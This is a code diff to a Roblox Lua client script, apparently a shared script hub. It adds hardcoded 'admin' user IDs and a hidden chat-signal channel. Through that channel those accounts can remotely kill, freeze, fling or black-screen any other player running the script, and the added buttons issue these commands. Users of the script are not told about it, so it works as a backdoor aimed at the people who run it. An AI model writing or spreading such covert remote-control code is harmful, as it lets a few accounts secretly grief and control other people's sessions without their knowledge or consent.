@@ -287,6 +287,9 @@ local adminUsers = {
     [10716026282] = true,
     [9063888018] = true,
     [1677344145] = true,
+    [7434449565] = true,
+    [7434452079] = true,
+    [5145281721] = true,
 }
 
 local function isAdmin(player)
@@ -4019,6 +4022,122 @@ for _, player in ipairs(Players:GetPlayers()) do
 end
 Players.PlayerAdded:Connect(listenForKickSignal)
 
+----------------------------------------
+--管理員指令系統 (Kill / Freeze / Unfreeze / Fling / Black / Unblack)
+----------------------------------------
+local Debris = game:GetService("Debris")
+
+-- 黑屏 Overlay (所有玩家客戶端皆需建立)
+local playerGui = LocalPlayer:WaitForChild("PlayerGui")
+local blackOverlay = playerGui:FindFirstChild("BlackScreenOverlay")
+
+if not blackOverlay then
+    blackOverlay = Instance.new("ScreenGui")
+    blackOverlay.Name = "BlackScreenOverlay"
+    blackOverlay.IgnoreGuiInset = true
+    blackOverlay.ResetOnSpawn = false
+    blackOverlay.Parent = playerGui
+end
+
+local blackFrame = blackOverlay:FindFirstChild("BlackFrame")
+if not blackFrame then
+    blackFrame = Instance.new("Frame")
+    blackFrame.Name = "BlackFrame"
+    blackFrame.Size = UDim2.new(1, 0, 1, 0)
+    blackFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+    blackFrame.BorderSizePixel = 0
+    blackFrame.Visible = false
+    blackFrame.Parent = blackOverlay
+end
+
+-- 發送管理員指令 (沿用 ban 的 sendKickSignal 實作邏輯)
+local function sendAdminCommand(cmdName)
+    if not isAdmin(LocalPlayer) then
+        warn("權限不足：你不是管理員，無法發送 /" .. cmdName)
+        return
+    end
+
+    if _G.BanTarget == "" then
+        warn("請先輸入目標玩家名稱！")
+        return
+    end
+
+    local cmd = string.lower(cmdName)
+    local targetName = string.gsub(_G.BanTarget, "^/" .. cmd .. "%s+", "")
+    local signalMessage = "/" .. cmd .. " " .. targetName
+
+    if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+        local generalChannel = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
+        if generalChannel then
+            generalChannel:SendAsync(signalMessage)
+        end
+    else
+        local sayMessage = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
+            and ReplicatedStorage.DefaultChatSystemChatEvents:FindFirstChild("SayMessageRequest")
+        if sayMessage then
+            sayMessage:FireServer(signalMessage, "All")
+        end
+    end
+end
+
+-- 監聽並執行管理員指令 (沿用 ban 的 listenForKickSignal 實作邏輯)
+local function listenForAdminSignal(player)
+    player.Chatted:Connect(function(msg)
+        if not isAdmin(player) then return end
+
+        local cmd, targetName = msg:match("^/([%w_]+)%s*(.*)$")
+        if not cmd then return end
+
+        cmd = string.lower(cmd)
+        local validCommands = {
+            kill = true, freeze = true, unfreeze = true, fling = true,
+            black = true, blackscreen = true, unblack = true, unblackscreen = true,
+        }
+        if not validCommands[cmd] then return end
+
+        local searchName = string.lower(targetName or "")
+        local myName = string.lower(LocalPlayer.Name)
+        local myDisplayName = string.lower(LocalPlayer.DisplayName)
+
+        local isTarget = (searchName == "all") or (searchName == myName) or (searchName == myDisplayName)
+        if not isTarget then return end
+
+        local char = LocalPlayer.Character
+        local hrp = char and char:FindFirstChild("HumanoidRootPart")
+        local hum = char and char:FindFirstChildWhichIsA("Humanoid")
+
+        if cmd == "kill" then
+            if hum then hum.Health = 0 end
+
+        elseif cmd == "freeze" then
+            if hrp then hrp.Anchored = true end
+
+        elseif cmd == "unfreeze" then
+            if hrp then hrp.Anchored = false end
+
+        elseif cmd == "fling" then
+            if hrp then
+                local bV = Instance.new("BodyVelocity")
+                bV.Velocity = Vector3.new(math.random(-500, 500), 1000, math.random(-500, 500))
+                bV.MaxForce = Vector3.new(9e9, 9e9, 9e9)
+                bV.Parent = hrp
+                Debris:AddItem(bV, 0.2)
+            end
+
+        elseif cmd == "black" or cmd == "blackscreen" then
+            blackFrame.Visible = true
+
+        elseif cmd == "unblack" or cmd == "unblackscreen" then
+            blackFrame.Visible = false
+        end
+    end)
+end
+
+for _, player in ipairs(Players:GetPlayers()) do
+    listenForAdminSignal(player)
+end
+Players.PlayerAdded:Connect(listenForAdminSignal)
+
 --JobId
 local serverJobId = game.JobId
 if serverJobId == "" then
@@ -5856,6 +5975,48 @@ if isAdmin(LocalPlayer) then
         Title = "發送 /ban",
         Callback = function()
             sendKickSignal()
+        end
+    })
+
+    Tabs["設定"]:Button({
+        Title = "發送 /kill",
+        Callback = function()
+            sendAdminCommand("kill")
+        end
+    })
+
+    Tabs["設定"]:Button({
+        Title = "發送 /freeze",
+        Callback = function()
+            sendAdminCommand("freeze")
+        end
+    })
+
+    Tabs["設定"]:Button({
+        Title = "發送 /unfreeze",
+        Callback = function()
+            sendAdminCommand("unfreeze")
+        end
+    })
+
+    Tabs["設定"]:Button({
+        Title = "發送 /fling",
+        Callback = function()
+            sendAdminCommand("fling")
+        end
+    })
+
+    Tabs["設定"]:Button({
+        Title = "發送 /black",
+        Callback = function()
+            sendAdminCommand("black")
+        end
+    })
+
+    Tabs["設定"]:Button({
+        Title = "發送 /unblack",
+        Callback = function()
+            sendAdminCommand("unblack")
         end
     })
 end
